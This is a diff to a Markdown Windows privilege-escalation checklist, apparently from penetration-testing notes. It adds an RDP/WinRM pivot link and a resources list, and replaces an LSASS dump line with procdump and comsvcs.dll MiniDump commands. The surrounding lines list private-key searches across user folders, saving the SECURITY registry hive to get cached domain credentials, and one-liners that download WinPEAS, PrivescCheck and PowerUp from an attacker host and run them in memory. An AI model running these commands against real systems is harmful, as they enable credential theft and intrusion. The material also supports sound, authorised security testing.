@@ -74,6 +74,7 @@
 - [ ] SSH / RDP / WinRM pivoting
   - [ ] `Get-Service sshd`
   - [ ] `Test-WSMan localhost` # WinRM available?
+  - [ ] Enable front-door access if you have local admin: [Enable RDP / WinRM](../infiltration/windows/enable-rdp-winrm.md)
   - [ ] Any private keys? `Get-ChildItem -Path C:\Users -Recurse -Filter "id_rsa" -ErrorAction SilentlyContinue`
   - [ ] `Get-ChildItem -Path C:\Users -Recurse -Filter "*.pem","*.pfx","*.p12" -ErrorAction SilentlyContinue`
   - [ ] Spray discovered passwords:
@@ -139,8 +140,7 @@
 - [ ] `reg save HKLM\SECURITY C:\Temp\security.hive` # Domain cached creds
 - [ ] Exfil and crack with `secretsdump.py` or `pypykatz`
 - [ ] LSASS dump (if SeDebugPrivilege):
-  - [ ] `$p = Get-Process lsass; [System.IO.File]::WriteAllBytes('C:\Temp\lsass.dmp', (New-Object System.IO.MemoryStream).ToArray())`
-  - [ ] Better: use `procdump.exe -ma lsass.exe lsass.dmp` or `rundll32 comsvcs.dll, MiniDump $p.Id C:\Temp\lsass.dmp full`
+  - [ ] `procdump.exe -ma lsass.exe lsass.dmp` or `rundll32 comsvcs.dll, MiniDump $p.Id C:\Temp\lsass.dmp full`
 
 ### Writable Sensitive Files
 
@@ -209,3 +209,10 @@ whoami /all; systeminfo | Select-String "OS|Domain|Hotfix"; Get-LocalGroupMember
 - [ ] Run **WinPEAS**: `curl http://$ATTACKER_IP/winpeas.exe -o C:\Temp\wp.exe; .\wp.exe`
 - [ ] Run **PrivescCheck**: `IEX (New-Object Net.WebClient).DownloadString('http://$ATTACKER_IP/PrivescCheck.ps1'); Invoke-PrivescCheck`
 - [ ] Run **PowerUp**: `IEX (New-Object Net.WebClient).DownloadString('http://$ATTACKER_IP/PowerUp.ps1'); Invoke-AllChecks`
+
+## Resources
+
+- [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) — automated Windows enum referenced in Quick Wins
+- [PrivescCheck](https://github.com/itm4n/PrivescCheck) — PowerShell checks referenced in Quick Wins
+- [Enable RDP / WinRM](../infiltration/windows/enable-rdp-winrm.md) — front-door session from a foothold
+- [PowerShell scripting](../enumeration/windows/powershell-scripting.md) — objects / `?` / `Get-Member`
